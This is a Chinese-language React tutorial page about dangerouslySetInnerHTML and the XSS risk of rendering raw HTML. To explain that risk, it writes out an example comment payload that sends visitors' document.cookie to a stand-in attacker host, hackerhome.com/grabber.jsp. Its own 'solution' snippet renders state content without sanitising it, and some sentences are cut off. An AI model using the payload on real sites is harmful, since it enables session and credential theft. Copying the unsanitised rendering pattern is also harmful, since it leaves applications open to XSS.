---
title: "react 中正常显示HTML(dangerouslySetInnerHTML)"
date: 2026-08-11
categories:
  - "React 系统教程"
tags:
  - "React"
  - "Redux"
  - "前端"
  - "教程"
  - "OneNote"
  - "核心概念与组件"
description: "如果要显示源 html 代码，可以使用 react 官网解释： 直接使用 innerHTML 可能会导致 cross site scripting (XSS) 攻击。 dangerouslySetInnerHTML 这个 prop 的命名是故意这么设计的，以此来警告，它的 pro。"
sidebarWeight: 23
lastUpdated: false
feed: false
source: onenote
sourceNote: "OneNote/f-vue/概念/JSX深入/react 中正常显示HTML(dangerouslySetInnerHTML).md"
---
::: v-pre

# react 中正常显示HTML(dangerouslySetInnerHTML)

> 本节目标：理解“react 中正常显示HTML(dangerouslySetInnerHTML)”的核心思路，并能把它用于实际开发或面试表达。
如果要显示源`html`代码，可以使用

`react`**官网解释：**
直接使用 `innerHTML` 可能会导致 `cross-site scripting (XSS)` 攻击。`dangerouslySetInnerHTML` 这个 `prop` 的命名是故意这么设计的，以此来警告，它的 `prop` 值（ 一个对象而不是字符串 ）应该被用来表明净化后的数据。

**解决办法：**

```
 <div dangerouslySetInnerHTML={{__html: this.state.content}}></div>
```

`cross-site scripting (XSS)`**攻击**``以一个博客应用为例。其常常需要允许读者对博主的文章进行评论。在输入评论的编辑栏中，我们可以输入对该文章的评论，也可以输入以下`HTML`标记：
`\<Script\>alert(`“`XSS attack available!`”`);\</Script\>`
而从用户的角度来看，该网页中就出现了一个警告：
也就是说，用户输入的脚本语言已经被用户的浏览器成功执行。当然，这可能只是一个对该网站的善意提醒。但是

对于一个真正具有恶意的攻击者，其所插入的脚本代码更可能如下所示：
`\<script\>document.write('\<img src=http://www.hackerhome.com/grabber.jsp?msg='+document.cookie+' width=16 height=16 border=0 /\>');\</script\>`

该段脚本将向当前评论内插入一个图片，而该图片所对应的`URL`则指向了`hackerhome`中的`JSP`页面`grabber.jsp`。从访问该评论的用户这一角度看来，其仅仅是一个不能显示的图片。但是对于恶意攻击者而言，该`JSP`页面将自动记录传入的`msg`参数内容，即访问评论用户所使用的`cookie`。该`cookie`可能包含用户的敏感信息，甚至是用户名，密码等重要信息。

所以，`react`的做法是不直接读取你的`html`代码，以此来避免`cross-site scripting (XSS)`攻击，让你的代码更加安全。
可以参考这篇文章：`http://www.cnblogs.com/loveis715/archive/2012/07/13/2506846.html`

:::
